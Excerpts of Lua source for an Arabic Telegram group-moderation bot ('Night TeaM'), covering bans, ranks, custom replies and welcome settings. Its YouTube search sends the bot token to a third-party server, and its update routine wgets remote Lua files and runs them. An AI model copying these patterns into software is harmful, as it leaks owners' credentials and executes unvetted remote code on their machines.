Ali_Night(msg.chat_id_, msg.id_, 0,'✯︙*لا يوجد محظورين*', 1, 'md')
AliNight:del(Night..'Abs:Ban:'..msg.chat_id_)
else
local x = 0
...
local Muted = AliNight:scard(Night.."Abs:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
...
local ConstructorList = AliNight:scard(Night.."Abs:Constructor:"..ChatId) or 0
local BanedList = AliNight:scard(Night.."Abs:Ban:"..ChatId) or 0
local ManagerList = AliNight:scard(Night.."Abs:Managers:"..ChatId) or 0
local MutedList = AliNight:scard(Night.."Abs:Muted:"..ChatId) or 0
local TkeedList = AliNight:scard(Night.."Abs:Abs:Tkeed:"..ChatId) or 0
local AdminsList = AliNight:scard(Night.."Abs:Admins:"..ChatId) or 0
local VipList = AliNight:scard(Night.."Abs:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/sheserlo0' end
...
ConstructorAbs = "["..Abs.first_name_.."](T.me/"..(Abs.username_ or "NightTEAM")..")"
else 
ConstructorAbs = "حساب محذوف"
end
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙المجموعه ↫ ["..dp.title_.."]("..LinkGroup..")\n✯︙الايدي ↫ ( `"..ChatId.."` )\n✯︙المنشئ ↫ "..ConstructorAbs.."\n✯︙عدد المدراء ↫ ( *"..ManagerList.."* )\n✯︙عدد المنشئين ↫ ( *"..ConstructorList.."* )\n✯︙عدد الادمنيه ↫ ( *"..AdminsList.."* )\n✯︙عدد المميزين ↫ ( *"..VipList.."* )\n✯︙عدد المحظورين ↫ ( *"..BanedList.."* )\n✯︙عدد المقيدين ↫ ( *"..TkeedList.."* )\n✯︙عدد المكتومين ↫ ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙لم تتم اضافتي بها لاقوم بكشفها", 1, "md")
end
end,nil)
end,nil)
end 
...
AliNight:set(Night..'Abs:Num:Add:Bot',Num) 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم وضع عدد الاعضاء ↫ *'..Num..'* عضو', 1, 'md')
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:Lock:Gamesinline'..msg.chat_id_) 
end
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:Lock:Gamesinline'..msg.chat_id_,true)  
end
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night.."Abs:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night.."Abs:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
if text and (text == "تفعيل حذف الردود" or text == "تفعيل مسح الردود") and ChCheck(msg) then 
if not AbsConstructor(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل حذف ردود المدير'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night.."Abs:Lock:GpRd"..msg.chat_id_)
return false  
end
end
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night.."Abs:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل اضف رد'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night.."Abs:Lock:Rd"..msg.chat_id_)
return false  
end
end
...
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل اضف رد'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night.."Abs:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
Text = "✯︙تم تفعيل المجموعه "..dp.title_
local inline = {{{text="‹ ترتيب الاوامر ›",callback_data="/SetCmdGp:"..msg.sender_user_id_},{text="‹ رفع الادمنيه ›",callback_data="/UploadAdmin:"..msg.sender_user_id_}},{{text="‹ غادر ›",callback_data="/LeaveBot:"..msg.sender_user_id_},{text="‹ تعطيل ›",callback_data="/Stop:"..msg.sender_user_id_}},{{text="‹ Night TeaM ›",url="t.me/sheserlo0"}}}
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
AliNight:sadd(Night.."Abs:Groups",msg.chat_id_)
if not AliNight:get(Night..'Abs:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
AliNight:incrby(Night..'Abs:Sudos'..msg.sender_user_id_,1)
AliNight:set(Night..'Abs:SudosGp'..msg.sender_user_id_..msg.chat_id_,"Abs")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not AliNight:sismember(Night..'Abs:Groups',msg.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙المجموعه بالتاكيد معطله', 1, 'md')
else
Text = "✯︙تم تعطيل المجموعه "..dp.title_
local inline = {{{text="‹ غادر ›",callback_data="/LeaveBot:"..msg.sender_user_id_},{text="‹ تفعيل ›",callback_data="/On:"..msg.sender_user_id_}},{{text="‹ Night TeaM ›",url="t.me/sheserlo0"}}}
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
AliNight:srem(Night.."Abs:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
AbsText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
AliNight:set(Night..'Abs:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
AbsText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
AliNight:set(Night..'Abs:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
AbsText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
AliNight:set(Night..'Abs:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
AbsText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
AliNight:set(Night..'Abs:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
AbsText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
AliNight:set(Night..'Abs:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
AbsText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
AliNight:set(Night..'Abs:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
AbsText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
AliNight:set(Night..'Abs:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
AbsText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
AliNight:set(Night..'Abs:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
...
if not Bot(msg) and AliNight:get(Night..'Abs:Lock:Rd'..msg.chat_id_) then 
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙للمدير واعلى فقط ', 1, 'md')
else
...
if not Bot(msg) and AliNight:get(Night..'Abs:Lock:Rd'..msg.chat_id_) then 
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙لاتستطيع اضافه رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙للمدير واعلى فقط ', 1, 'md')
...
AliNight:set(Night..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SetKt')
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙حسنا ارسل امر `كت تويت` الان" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetKt = AliNight:get(Night..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SetKt == 'SetKt' then
if text == "الغاء" then 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم الغاء الامر" ,  1, "md")
AliNight:del(Night..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
...
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حفظ الامر ارسل السؤال الاول\n✯︙للخروج ارسل ↫ ( الغاء )" ,  1, "md")
AliNight:set(Night..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SaveKt')
AliNight:set(Night..'Abs:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_,text)
AliNight:sadd(Night..'Abs:Sudo:Kt'..msg.chat_id_,text)
return false
end end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if not SecondSudo(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙للمطور الثانوي واعلى فقط ', 1, 'md')
return false
end
...
AliNight:set(Night.."Abs:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
...
AliNight:sadd(Night.."Abs:Sudo:AllRed",text)
AliNight:set(Night.."DelSudoRep",text)
keyboard = {} 
...
if not Bot(msg) and AliNight:get(Night..'Abs:Lock:GpRd'..msg.chat_id_) then 
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙لاتستطيع حذف ردود المتعدده وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙للمدير او اعلى فقط ', 1, 'md')
else
local redod = AliNight:smembers(Night..'Abs:Manager:GpRedod'..msg.chat_id_)
if #redod == 0 then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙لا توجد ردود متعدده مضافه" ,  1, "md")
...
dp = 'متحركه 🎭'
elseif AliNight:get(Night.."Abs:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif AliNight:get(Night.."Abs:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif AliNight:get(Night.."Abs:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif AliNight:get(Night.."Abs:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif AliNight:get(Night.."Abs:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif AliNight:get(Night.."Abs:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
...
if not Bot(msg) and AliNight:get(Night..'Abs:Lock:GpRd'..msg.chat_id_) then 
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙لاتستطيع حذف ردود المدير وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙للمدير او اعلى فقط ', 1, 'md')
...
for k,v in pairs(redod) do
AliNight:del(Night..'Abs:Gif:GpRed'..v..msg.chat_id_)
AliNight:del(Night..'Abs:Voice:GpRed'..v..msg.chat_id_)
AliNight:del(Night..'Abs:Audio:GpRed'..v..msg.chat_id_)
AliNight:del(Night..'Abs:Photo:GpRed'..v..msg.chat_id_)
AliNight:del(Night..'Abs:Stecker:GpRed'..v..msg.chat_id_)
AliNight:del(Night..'Abs:Video:GpRed'..v..msg.chat_id_)
AliNight:del(Night..'Abs:File:GpRed'..v..msg.chat_id_)
AliNight:del(Night..'Abs:Text:GpRed'..v..msg.chat_id_)
AliNight:del(Night..'Abs:Manager:GpRed'..msg.chat_id_)
end
...
MsgRep = '✯︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if AliNight:get(Night.."Abs:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif AliNight:get(Night.."Abs:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif AliNight:get(Night.."Abs:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif AliNight:get(Night.."Abs:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif AliNight:get(Night.."Abs:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif AliNight:get(Night.."Abs:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif AliNight:get(Night.."Abs:File:AllRed"..v) then
dp = 'ملف 📁'
...
if not Bot(msg) and AliNight:get(Night..'Abs:Lock:GpRd'..msg.chat_id_) then 
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙لاتستطيع حذف ردود المطور وذالك بسبب تعطيله', 1, 'md')
return false
end
if not SecondSudo(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙للمطور الثانوي او اعلى فقط ', 1, 'md')
else
local redod = AliNight:smembers(Night.."Abs:Sudo:AllRed")
if #redod == 0 then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙لا توجد ردود مضافه" ,  1, "md")
...
AliNight:del(Night..Help) 
end
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم استعادة الكلايش الاصليه" ,  1, "md") 
end
...
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙ارسل كليشة (الاوامر) الان " ,  1, "md")
...
local Leave = AliNight:get(Night..'Abs:Leave')
local Text = [[
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night.."Abs:WhyTube"..msg.chat_id_) 
return false  
end
if text == 'تعطيل اليوتيوب' and Manager(msg) then  
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل اليوتيوب بنجاح'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night.."Abs:WhyTube"..msg.chat_id_,true) 
return false  
end 
if text and text:match('^بحث (.*)$') and not AliNight:get(Night.."Abs:WhyTube"..msg.chat_id_) and ChCheck(msg) then            
local Text = text:match('^بحث (.*)$') 
local msg_id = msg.id_/2097152/0.5 
https.request('https://ccccxcc.ml/Night/Yt.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if SecondSudo(msg) then
...
io.popen("cd Files && wget https://raw.githubusercontent.com/aliNightTeaM/NightFiles/main/NightFiles/AddedMe.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/aliNightTeaM/NightFiles/main/NightFiles/AutoFile.lua")  
io.popen("cd Files && wget https://raw.githubusercontent.com/aliNightTeaM/NightFiles/main/NightFiles/ChangeName.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/aliNightTeaM/NightFiles/main/NightFiles/ChangePhoto.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/aliNightTeaM/NightFiles/main/NightFiles/ChangeUser.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/aliNightTeaM/NightFiles/main/NightFiles/MuteNames.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/aliNightTeaM/NightFiles/main/NightFiles/ProNames.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/aliNightTeaM/NightFiles/main/NightFiles/ReplyBot.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/aliNightTeaM/NightFiles/main/NightFiles/TagAdmins.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/aliNightTeaM/NightFiles/main/NightFiles/TagAll.lua") 
Ali_Night(msg.chat_id_, msg.id_, 1, '♪︙تم تحديث المتجر الى الاصدار الجديد', 1, 'md') 
dofile('Night.lua') 
end
...
local Users = AliNight:smembers(Night.."User_Bot")
...
local id = Users[i]
if id:match("^(%d+)") then
AliNight:sadd(Night..'Abs:Users',Users[i]) 
end
end
for i = 1, #Sudos do
AliNight:sadd(Night..'Abs:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
AliNight:sadd(Night..'Abs:Groups',Groups[i]) 
if AliNight:get(Night.."Private:Group:Link"..Groups[i]) then
AliNight:set(Night.."Abs:Groups:Links"..Groups[i],AliNight:get(Night.."Private:Group:Link"..Groups[i]))
end
if AliNight:get(Night.."Get:Welcome:Group"..Groups[i]) then
AliNight:set(Night..'Abs:Groups:Welcomes'..Groups[i],AliNight:get(Night.."Get:Welcome:Group"..Groups[i]))
end
local list2 = AliNight:smembers(Night..'Constructor'..Groups[i])
for k,v in pairs(list2) do
AliNight:sadd(Night.."Abs:Constructor:"..Groups[i], v)
end
local list3 = AliNight:smembers(Night..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
AliNight:sadd(Night.."Abs:BasicConstructor:"..Groups[i], v)
end
local list4 = AliNight:smembers(Night..'Manager'..Groups[i])
for k,v in pairs(list4) do
AliNight:sadd(Night.."Abs:Managers:"..Groups[i], v)
end
local list5 = AliNight:smembers(Night..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
AliNight:sadd(Night.."Abs:Admins:"..Groups[i], v)
end
local list6 = AliNight:smembers(Night..'Special:User'..Groups[i])
for k,v in pairs(list6) do
AliNight:sadd(Night.."Abs:VipMem:"..Groups[i], v)
end
AliNight:set(Night.."Abs:Lock:Bots"..Groups[i],"del") AliNight:hset(Night.."Abs:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
...
for i,Lock in pairs(LockList) do
AliNight:set(Night..Lock..Groups[i],true)
end
end
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم حذف معلومات الترحيب', 1, 'md')   
AliNight:del(Night..'Abs:Text:BotWelcome')
AliNight:del(Night..'Abs:Photo:BotWelcome')
return false
end 
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم تفعيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
AliNight:del(Night..'Abs:Lock:BotWelcome')
return false
end 
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم تعطيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
AliNight:set(Night..'Abs:Lock:BotWelcome',true)
return false
end 
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙ارسل لي نص الترحيب', 1, 'md') 
AliNight:del(Night..'Abs:Text:BotWelcome')
AliNight:del(Night..'Abs:Photo:BotWelcome')
AliNight:set(Night.."Abs:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and AliNight:get(Night.."Abs:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم الغاء الامر", 1, "md") 
AliNight:del(Night.."Abs:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حفظ النص ارسل لي صورة الترحيب\n✯︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
AliNight:set(Night.."Abs:Text:BotWelcome",text) 
AliNight:set(Night.."Abs:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if AliNight:get(Night.."Abs:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حفظ النص والغاء حفظ صورة الترحيب", 1, "md") 
AliNight:del(Night.."Abs:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
AliNight:set(Night.."Abs:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حفظ النص وصورة الترحيب", 1, 'md')   
AliNight:del(Night.."Abs:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
...
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙تم حذف كليشة المطور", 1, "md")
...
Text = [[
✯︙[قناة السورس](https://t.me/sheserlo0)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯ قناة السورس',url="t.me/sheserlo0"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sheserlo0&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
Text = [[
✯︙[مبرمج السورس](https://t.me/h_a_m_a_d_a77)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯ مبرمج السورس',url="t.me/h_a_m_a_d_a77"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/h_a_m_a_d_a77&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
Ali_Night(msg.chat_id_, msg.id_, 1, io.popen([[
...
AliNight:incr(Night..'Abs:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if AliNight:get(Night..'Abs:Lock:EditMsgs'..msg.chat_id_) and not Text and not AbsConstructor(result) then
...
local GetMsgPin = AliNight:get(Night..'Abs:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;AliNight:del(Night..'Abs:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) AliNight:del(Night..'Abs:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
...
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=Night,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
AliNight:srem(Night..'Abs:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
AliNight:srem(Night..'Abs:Groups',v)  
end
...
AliNight:sadd(Night..'Abs:Groups',v)  
end end,nil) end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
end 
